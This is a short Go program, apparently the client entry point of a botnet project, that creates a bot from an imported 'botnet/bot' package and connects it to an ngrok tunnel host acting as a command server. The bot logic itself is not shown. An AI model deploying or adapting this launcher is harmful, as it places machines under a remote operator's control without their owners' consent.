package main

import (
	"log"

	"github.com/adrianosela/botnet/bot"
)

func main() {
	b, err := bot.NewBot("2067e9ff.ngrok.io")
	if err != nil {
		log.Fatal(err)
	}
	b.Run()
}
